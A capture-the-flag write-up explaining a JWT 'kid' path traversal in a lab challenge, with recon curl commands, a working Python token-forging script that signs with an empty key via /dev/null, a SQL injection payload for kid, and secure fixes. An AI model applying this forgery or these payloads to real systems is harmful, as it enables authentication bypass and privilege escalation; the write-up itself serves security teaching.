JWT kid Path Traversal

TL;DR

Challenge Description

The challenge lore read:

"The gates of Midgard do not open for ordinary travelers. A relic-protected hall stands behind an ancient passage system, and only those recognized as einherjar may enter. Perhaps the path forward is not to break the gate directly, but to understand what it trusts."

Visiting the challenge at http://lab.redfoxsec.com:8401/ presented a registration form. After registering with any username, the server issued a JWT token as a cookie. The /hall endpoint was the protected target.

Background: What is a JWT?

A JSON Web Token (JWT) is a compact, URL-safe token used for authentication. It has three Base64-encoded parts separated by dots:

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imd1ZXN0LmtleSJ9.eyJzdWIiOiJlaW5oZXJqYXIiLCJyZWFsbSI6Im1pZGdhcmQiLCJyb2xlIjoibW9ydGFsIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Header — algorithm, type, kid
Payload — claims (sub, role, realm)
Signature — HMAC of header.payload

The server verifies the signature using a secret key. If the signature is valid, the server trusts the claims in the payload. The kid (Key ID) parameter in the header tells the server which key file to use for verification.

Reconnaissance

Step 1 — Register and Capture the Token

We registered with the username einherjar (trying to match the required role name) and captured the issued JWT:

bash 
curl -v -X POST http://lab.redfoxsec.com:8401/register \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt \
  -d "username=einherjar"

The response set a token cookie containing the JWT.

Step 2 — Decode the JWT

We decoded each part of the token:

bash 
# Decode header (first part)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Imd1ZXN0LmtleSJ9" \
  | base64 -d 2>/dev/null; echo

# Decode payload (second part)
echo "eyJzdWIiOiJlaW5oZXJqYXIiLCJyZWFsbSI6Im1pZGdhcmQiLCJyb2xlIjoibW9ydGFsIn0" \
  | base64 -d 2>/dev/null; echo

Decoded Header:

json 
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "guest.key"   // <-- key file used for signature verification
}

Decoded Payload:

json 
{
  "sub": "einherjar",
  "realm": "midgard",
  "role": "mortal"   // <-- we need this to be "einherjar"
}
⚡ Key Observation

The kid field in the header was set to "guest.key" — meaning the server reads a file called guest.key and uses its contents as the HMAC secret. If we can control which file it reads, we can control the secret!

The Vulnerability: kid Path Traversal

The kid parameter is meant to be a key identifier — but if the server uses it to directly construct a file path like keys/{kid}, an attacker can point it to any file on the system.

The classic attack is to point kid to /dev/null. Here's why this works:

linux concept 
# /dev/null is a special file that always returns empty content
$ cat /dev/null
# (no output — empty string)

# So if the server does:
secret = read_file(kid)  # kid = "/dev/null"
# secret = "" (empty string)

# We can forge any token signed with empty string as the HMAC key!

We first tried alg: none — removing the signature entirely. The server rejected it. We then tried common weak secrets. Both failed. The kid path traversal to /dev/null was the intended path.

Attempt Method Result
1st attempt alg: none (no signature) DENIED
2nd attempt Forged with wrong signature DENIED
3rd attempt Brute force common secrets DENIED
4th attempt kid → /dev/null (empty secret) SUCCESS

Exploitation

Step 1 — Forge the Malicious JWT

We crafted a new JWT with kid pointing to /dev/null, role set to einherjar, and signed it with an empty string as the HMAC-SHA256 secret:

python 
import hmac, hashlib, base64, json

def b64e(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Forged header — kid points to /dev/null
header = b64e(json.dumps({
    "alg": "HS256",
    "typ": "JWT",
    "kid": "/dev/null"   # <-- the key part
}, separators=(',', ':')))

# Forged payload — role escalated to einherjar
payload = b64e(json.dumps({
    "sub": "einherjar",
    "realm": "midgard",
    "role": "einherjar"   # <-- escalated role
}, separators=(',', ':')))

# Sign with EMPTY secret (what /dev/null contains)
msg = f"{header}.{payload}"
sig = hmac.new(b'', msg.encode(), hashlib.sha256).digest()
forged_token = f"{msg}.{b64e(sig)}"

print(forged_token)

Step 2 — Use the Forged Token

We sent the forged JWT to the protected /hall endpoint:

bash 
curl http://lab.redfoxsec.com:8401/hall \
  -H "Cookie: token=<forged_token>"

Step 3 — Hall Unlocked

The server verified our token by reading /dev/null as the key file, got an empty string, computed the expected HMAC with an empty secret — which matched our signature exactly. We were granted access as einherjar and retrieved the flag.

The hall accepted our forged passage. The server trusted the kid field without validation, allowing us to dictate the verification key.

Why This Works — The Technical Detail

When the server verifies a JWT with kid: /dev/null, the internal logic looks something like this:

python — vulnerable server code (conceptual) 
def verify_jwt(token):
    header, payload, sig = token.split('.')
    decoded_header = json.loads(base64.decode(header))
    
    kid = decoded_header['kid']   # attacker controls this!
    
    # Vulnerable: directly uses kid as file path — NO sanitization
    key_path = f"keys/{kid}"           # becomes "keys//dev/null"
    # OR just: open(kid)              # becomes open("/dev/null")
    
    with open(key_path) as f:
        secret = f.read()             # reads empty string from /dev/null
    
    expected_sig = hmac.new(
        secret.encode(),              # empty string b''
        f"{header}.{payload}".encode(),
        hashlib.sha256
    ).hexdigest()
    
    return sig == expected_sig       # matches our forged sig! ✓

The critical flaw is that kid from the JWT header is used directly as a file path without any sanitization. An attacker can point it to any readable file on the system — /dev/null for an empty secret, or /proc/self/environ for environment variables, or any other known file.

Other kid Exploitation Paths

Beyond /dev/null, a vulnerable kid implementation can be abused in other ways:

PATH_01
/dev/null
Empty file → sign with empty string. The most reliable cross-platform attack.
PATH_02
Known static files
/etc/hostname, /etc/passwd — if content is known, use it as the HMAC key.
PATH_03
SQL Injection
If kid is used in a DB query: kid=' UNION SELECT 'attacker_key'-- forces a known key.
PATH_04
Uploaded files
Upload a file with known content, then point kid to it. Full key control.

Vulnerabilities & Fixes

1. Unsanitized kid Parameter

The server used the kid value directly as a file path without any validation, allowing path traversal to arbitrary files on the system.

Fix: Never use the kid parameter directly as a file path. Validate it against an allowlist of known key IDs. Use a lookup table (database or config file) mapping IDs to key material.

python — secure implementation 
# ✅ SECURE: allowlist approach
ALLOWED_KEYS = {
    "guest.key": "super_secret_guest_value",
    "admin.key": "super_secret_admin_value",
}

def get_key(kid):
    if kid not in ALLOWED_KEYS:
        raise ValueError(f"Unknown key ID: {kid}")
    return ALLOWED_KEYS[kid]

# ❌ VULNERABLE: direct file path
def get_key_vulnerable(kid):
    with open(kid) as f:   # attacker controls kid!
        return f.read()

2. Trusting Client-Supplied Algorithm

The server accepted the algorithm specified in the JWT header. In a properly configured system, the server should enforce its own expected algorithm and reject tokens that use anything else.

Fix: Hardcode the expected algorithm server-side. Never read it from the token header. Explicitly reject alg: none and unexpected algorithms.

3. Weak Role Validation

The role claim was trusted directly from the JWT payload. Once the signature was forged, any role could be claimed.

Fix: For high-privilege operations, validate roles server-side against a database in addition to verifying the JWT signature. Never rely solely on JWT claims for authorization decisions.

Key Takeaways

This challenge demonstrates a subtle but critical class of JWT vulnerabilities. The kid parameter is part of the JWT standard and is designed to help servers select the right key when multiple keys are in use. However, it was never intended to be used as a raw file path.

The lesson here applies broadly: never trust input from a client to construct file paths, database queries, or system commands. The JWT header is just as attacker-controlled as any HTTP parameter. Every field in it must be validated before use.

The /dev/null trick specifically works because it is a predictable, always-present file on every Linux/Unix system that returns an empty byte stream — making the HMAC secret deterministically empty and therefore forgeable.
